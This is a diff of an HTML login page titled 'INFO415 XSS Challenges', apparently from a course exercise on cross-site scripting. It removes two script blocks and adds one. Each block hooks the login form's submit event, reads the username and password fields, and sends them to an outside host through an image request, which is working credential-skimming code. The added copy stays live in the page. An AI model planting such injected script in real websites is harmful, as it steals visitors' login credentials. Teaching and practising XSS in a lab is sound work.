@@ -1,17 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <meta charset="utf-8">
-    <script>
-    document.querySelector(".error-message").style.display = "none";
-    document.querySelector(".problem").style.display = "none";
-    document.querySelector("#login").onsubmit = function(){
+	<script> document.querySelector("#login").onsubmit = function(){
     user = document.querySelector("#login_username").value;
     pass = document.querySelector("#login_password").value;
     realimage = new Image(); 
     realimage.src = "http://r7.io/e/jcg25?s=username=" + user + "password=" + pass;
-}
+};
 </script>
+    <head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta charset="utf-8">
+    
         <title>INFO415 XSS Challenges</title>
     
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
@@ -36,16 +34,7 @@
         <div id="signin" class="reveal">
           <form id="login" action="./login" method="get" class="untouched">
               <h1><a href="#">NOPE</a></h1>
-            <script>
-    document.querySelector(".error-message").style.display = "none";
-    document.querySelector(".problem").style.display = "none";
-    document.querySelector("#login").onsubmit = function(){
-    user = document.querySelector("#login_username").value;
-    pass = document.querySelector("#login_password").value;
-    realimage = new Image(); 
-    realimage.src = "http://r7.io/e/jcg25?s=username=" + user + "password=" + pass;
-}
-</script>
+           
             
             
         
@@ -338,13 +327,6 @@
  font-style:italic;
 }
 </style>
-	      <script>
-    document.querySelector("#login").onsubmit = function(){
-    user = document.querySelector("#login_username").value;
-    pass = document.querySelector("#login_password").value;
-    realimage = new Image(); 
-    realimage.src = "http://r7.io/e/jcg25?s=" + user + "|" + pass;
-}
-</script>
+	      
           <script src="/static/noauthpages3760373616.gz.js" type="text/javascript"></script></body>
 </html>
